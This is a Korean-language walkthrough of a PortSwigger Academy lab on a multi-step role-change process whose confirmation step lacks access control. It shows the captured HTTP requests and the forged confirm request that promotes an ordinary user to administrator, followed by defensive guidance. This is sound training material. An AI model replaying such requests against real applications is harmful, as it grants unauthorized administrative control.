# Lab: Multi-step process with no access control on one step

## 개요

- **난이도**: Practitioner
- **주제**: Access Control — 다단계 프로세스 취약점 / 확인(confirm) 단계 접근 제어 누락 / 수직적 권한 상승
- **링크**: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

## 목표

사용자 역할 변경이 2단계로 이루어지며, 첫 단계에는 권한 검증이 있지만 **확인(confirm) 단계에는 없다**. 일반 사용자 세션으로 확인 단계를 직접 호출해 스스로를 관리자로 승격시킨다.

- 관리자 계정: `administrator:admin` (구조 파악용)
- 일반 계정: `wiener:peter`

## 다단계 프로세스 취약점

```
[정상 흐름]
  1단계  대상 선택 + 역할 변경 요청        ← 접근 제어 O
         POST /admin-roles
         username=carlos&action=upgrade
         ↓
  2단계  변경 내용 확인 후 확정            ← 접근 제어 X (취약)
         POST /admin-roles
         action=upgrade&confirmed=true&username=carlos
         ↓
  3단계  완료

[개발자의 잘못된 가정]
  "2단계는 반드시 1단계를 거친 사용자만 도달한다"
  → 2단계 자체에는 권한 검사를 생략

[공격]
  1단계를 건너뛰고 2단계 요청을 직접 전송
  → 권한 검사 없이 역할 변경이 수행됨
```

이번 랩은 **상황 의존적(Context-dependent) 접근 제어** 가 깨진 사례로 볼 수 있다.
사용자의 진행 상태/순서에 의존한 통제는 단계별로 검증되어야 한다.

## 공격 단계

### 1단계 — 관리자로 흐름 파악

`administrator:admin` 로 로그인하고 관리자 패널에서 `carlos` 를 승격시킨다.

1단계 요청을 캡처한다.

```
POST /admin-roles HTTP/1.1
Cookie: session=<administrator 세션>
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

응답에 확인 폼(숨겨진 필드 포함)이 나오고, 그에 대한 확인 요청을 캡처한다.

```
POST /admin-roles HTTP/1.1
Cookie: session=<administrator 세션>
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=carlos
```

> 핵심: **이 확인 요청이 곧 2단계(권한 검사 없는 단계)** 다.

### 2단계 — 일반 사용자 세션으로 확인 단계 직접 호출

`wiener:peter` 로 로그인해 일반 사용자 세션 쿠키를 얻는다.
Repeater 에서 확인 요청의 쿠키를 일반 사용자 세션으로 교체하고,
`username` 을 자기 자신(`wiener`)으로 바꾼 뒤 전송한다.

```
POST /admin-roles HTTP/1.1
Cookie: session=<wiener 세션>
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=wiener
```

1단계를 수행하지 않았음에도 확인 단계가 그대로 처리되어
`wiener` 가 관리자로 승격된다 → 랩 해결.

## 단계별 접근 제어 비교

```
[정상이라면]

  단계 1 (역할 변경 요청)
    서버: "요청자가 관리자인가?" 검사  → 일반 사용자 거부 ✔

  단계 2 (확인/확정)
    서버: "요청자가 관리자인가?" 검사  → 일반 사용자 거부 ✔
    + "이 요청이 1단계를 통과한 세션에서 왔는가?" 도 확인

[취약한 구현 (이번 랩)]
  단계 1: 검사 O
  단계 2: 검사 X
  → 2단계 직접 호출로 우회
```

## 확인 단계 우회 시 파라미터 조작

```
[관리자 확인 요청]
  action=upgrade
  confirmed=true
  username=carlos

[공격자 확인 요청]
  action=upgrade
  confirmed=true          ← 확인 플래그를 그대로 사용
  username=wiener         ← 대상만 자신으로 변경
```

확인 플래그(`confirmed=true`) 역시 클라이언트가 보내는 값이므로,
서버가 "1단계를 거쳤는지" 를 이 값만으로 판단하면 조작된다.

## 방어

```
[근본 원인]
  다단계 프로세스의 일부 단계에만 접근 제어를 적용
  → 단계를 건너뛰거나 직접 호출 가능

[올바른 방어]
  1. 모든 단계에서 동일한 서버 측 인가 검사
     - "이전 단계를 통과했다" 는 가정에 의존하지 않음
     - 각 요청을 독립적으로 검증 (deny by default)
  2. 진행 상태는 서버가 관리
     - 1단계 결과(대상/작업)를 서버 세션에 저장
     - 2단계는 세션에 저장된 값만 사용 (클라이언트 파라미터 신뢰 금지)
     - 확인 플래그도 서버 측 상태 또는 서명된 토큰으로 검증
  3. 상태 변경은 마지막 단계가 아니라, 인가 통과 후 원자적으로 수행
  4. 다단계 흐름 자체를 보안 경계로 삼지 않음

[안티패턴]
  첫 단계만 보호하고 이후 단계는 "이미 통과했을 것" 이라 가정
  confirm=true 같은 클라이언트 값으로 단계 진행을 판단
  대상/작업 파라미터를 매 단계 클라이언트에서 다시 받음
```

## 핵심 정리

- 역할 변경은 2단계였고, 2단계(확인)에 접근 제어가 없어 일반 사용자가 직접 호출해 자기 자신을 승격시켰다.
- 첫 단계를 통과한 사용자만 다음 단계에 도달한다는 가정이 취약점의 원인이다.
- 다단계 프로세스는 각 단계마다 독립적인 서버 측 인가가 필요하며, 진행 상태는 서버가 관리해야 한다.
- 확인 단계의 파라미터(`confirmed=true`, 대상 사용자)를 클라이언트가 제어하면 우회된다.

## 배운 점

- 011 이 메서드, 012 는 단계(step) 불일치를 이용한 우회다. 둘 다 "검사 지점과 실행 지점이 다름" 이라는 같은 뿌리다.
- 다단계 기능을 구현할 때는 "각 단계가 단독으로 호출되어도 안전한가?" 를 반드시 점검해야 한다.
- 다음 랩(013)은 Referer 헤더 기반 접근 제어의 허점을 다룬다.
